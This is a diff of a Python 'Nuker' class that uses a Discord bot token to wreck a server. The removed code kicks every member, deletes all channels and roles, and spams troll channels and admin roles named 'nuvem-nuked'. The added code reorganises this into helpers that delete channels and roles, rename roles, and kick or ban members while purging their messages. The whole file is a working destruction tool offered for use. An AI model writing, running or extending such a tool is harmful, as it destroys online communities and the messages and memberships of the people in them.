@@ -1,129 +1,66 @@
 import requests
 import time
-from rocket import rocket_launch_animation
 
 class Nuker:
-    def __init__(self, token):
+    def __init__(self, token, guild_id):
         self.token = token
+        self.guild_id = guild_id
         self.headers = {
-            'Authorization': f'Bot {self.token}',
-            'Content-Type': 'application/json'
+            "Authorization": f"Bot {self.token}",
+            "Content-Type": "application/json"
         }
-        self.api_url = 'https://discord.com/api/v10'
+        self.api_base = "https://discord.com/api/v10"
 
-    def get_servers(self):
-        url = f'{self.api_url}/users/@me/guilds'
-        try:
-            res = requests.get(url, headers=self.headers)
-            if res.status_code == 200:
-                return res.json()
-            else:
-                print(f"Failed to get servers: Status code {res.status_code}")
-                return []
-        except Exception as e:
-            print(f"Error fetching servers: {e}")
-            return []
+    def get_channels(self):
+        url = f"{self.api_base}/guilds/{self.guild_id}/channels"
+        r = requests.get(url, headers=self.headers)
+        if r.status_code == 200:
+            return r.json()
+        return []
 
-    def kick_all_members(self, guild_id):
-        url = f'{self.api_url}/guilds/{guild_id}/members'
-        members = []
-        try:
-            res = requests.get(url, headers=self.headers)
-            if res.status_code == 200:
-                members = res.json()
-            else:
-                print(f"Failed to get members: Status code {res.status_code}")
-                return
-        except Exception as e:
-            print(f"Error getting members: {e}")
-            return
+    def get_roles(self):
+        url = f"{self.api_base}/guilds/{self.guild_id}/roles"
+        r = requests.get(url, headers=self.headers)
+        if r.status_code == 200:
+            return r.json()
+        return []
 
-        print(f"Kicking {len(members)} members...")
+    def get_members(self):
+        url = f"{self.api_base}/guilds/{self.guild_id}/members?limit=1000"
+        r = requests.get(url, headers=self.headers)
+        if r.status_code == 200:
+            return r.json()
+        return []
 
-        for member in members:
-            user_id = member['user']['id']
-            kick_url = f'{self.api_url}/guilds/{guild_id}/members/{user_id}'
-            r = requests.delete(kick_url, headers=self.headers)
-            if r.status_code == 204:
-                print(f"Kicked user {user_id}")
-            else:
-                print(f"Failed to kick user {user_id}: {r.status_code}")
-            time.sleep(0.3)
+    def delete_channel(self, channel_id):
+        url = f"{self.api_base}/channels/{channel_id}"
+        r = requests.delete(url, headers=self.headers)
+        return r.status_code == 204
 
-    def delete_channels(self, guild_id):
-        url = f'{self.api_url}/guilds/{guild_id}/channels'
-        try:
-            res = requests.get(url, headers=self.headers)
-            if res.status_code == 200:
-                channels = res.json()
-                for channel in channels:
-                    del_url = f'{self.api_url}/channels/{channel["id"]}'
-                    r = requests.delete(del_url, headers=self.headers)
-                    if r.status_code == 204:
-                        print(f"Deleted channel {channel['name']}")
-                    else:
-                        print(f"Failed to delete channel {channel['name']}: {r.status_code}")
-                    time.sleep(0.3)
-            else:
-                print(f"Failed to get channels: Status code {res.status_code}")
-        except Exception as e:
-            print(f"Error deleting channels: {e}")
+    def create_channel(self, name):
+        url = f"{self.api_base}/guilds/{self.guild_id}/channels"
+        data = {"name": name, "type": 0}
+        r = requests.post(url, json=data, headers=self.headers)
+        return r.status_code == 201
 
-    def delete_roles(self, guild_id):
-        url = f'{self.api_url}/guilds/{guild_id}/roles'
-        try:
-            res = requests.get(url, headers=self.headers)
-            if res.status_code == 200:
-                roles = res.json()
-                for role in roles:
-                    if role['managed'] or role['name'] == '@everyone':
-                        continue
-                    del_url = f'{self.api_url}/guilds/{guild_id}/roles/{role["id"]}'
-                    r = requests.delete(del_url, headers=self.headers)
-                    if r.status_code == 204:
-                        print(f"Deleted role {role['name']}")
-                    else:
-                        print(f"Failed to delete role {role['name']}: {r.status_code}")
-                    time.sleep(0.3)
-            else:
-                print(f"Failed to get roles: Status code {res.status_code}")
-        except Exception as e:
-            print(f"Error deleting roles: {e}")
+    def delete_role(self, role_id):
+        url = f"{self.api_base}/guilds/{self.guild_id}/roles/{role_id}"
+        r = requests.delete(url, headers=self.headers)
+        return r.status_code == 204
 
-    def create_channel(self, guild_id, name):
-        url = f'{self.api_url}/guilds/{guild_id}/channels'
-        json_data = {"name": name, "type": 0}  # text channel
-        try:
-            r = requests.post(url, headers=self.headers, json=json_data)
-            if r.status_code == 201:
-                print(f"Created channel {name}")
-            else:
-                print(f"Failed to create channel {name}: {r.status_code}")
-        except Exception as e:
-            print(f"Error creating channel: {e}")
+    def rename_role(self, role_id, new_name):
+        url = f"{self.api_base}/guilds/{self.guild_id}/roles/{role_id}"
+        data = {"name": new_name}
+        r = requests.patch(url, json=data, headers=self.headers)
+        return r.status_code == 200
 
-    def create_role(self, guild_id, name):
-        url = f'{self.api_url}/guilds/{guild_id}/roles'
-        json_data = {"name": name, "permissions": "8"}  # admin perms
-        try:
-            r = requests.post(url, headers=self.headers, json=json_data)
-            if r.status_code == 201:
-                print(f"Created role {name}")
-            else:
-                print(f"Failed to create role {name}: {r.status_code}")
-        except Exception as e:
-            print(f"Error creating role: {e}")
+    def kick_member(self, user_id):
+        url = f"{self.api_base}/guilds/{self.guild_id}/members/{user_id}"
+        r = requests.delete(url, headers=self.headers)
+        return r.status_code == 204
 
-    def nuke(self, guild_id):
-        print("Starting nuke...")
-        self.kick_all_members(guild_id)
-        self.delete_channels(guild_id)
-        self.delete_roles(guild_id)
-
-        # Create 5 new channels and roles as a troll
-        for i in range(5):
-            self.create_channel(guild_id, f"nuvem-nuked-{i+1}")
-            self.create_role(guild_id, f"nuvem-role-{i+1}")
-
-        rocket_launch_animation()
-        print("Nuke complete!")
+    def ban_member(self, user_id, days=7):
+        url = f"{self.api_base}/guilds/{self.guild_id}/bans/{user_id}"
+        data = {"delete_message_days": days}
+        r = requests.put(url, json=data, headers=self.headers)
+        return r.status_code == 204
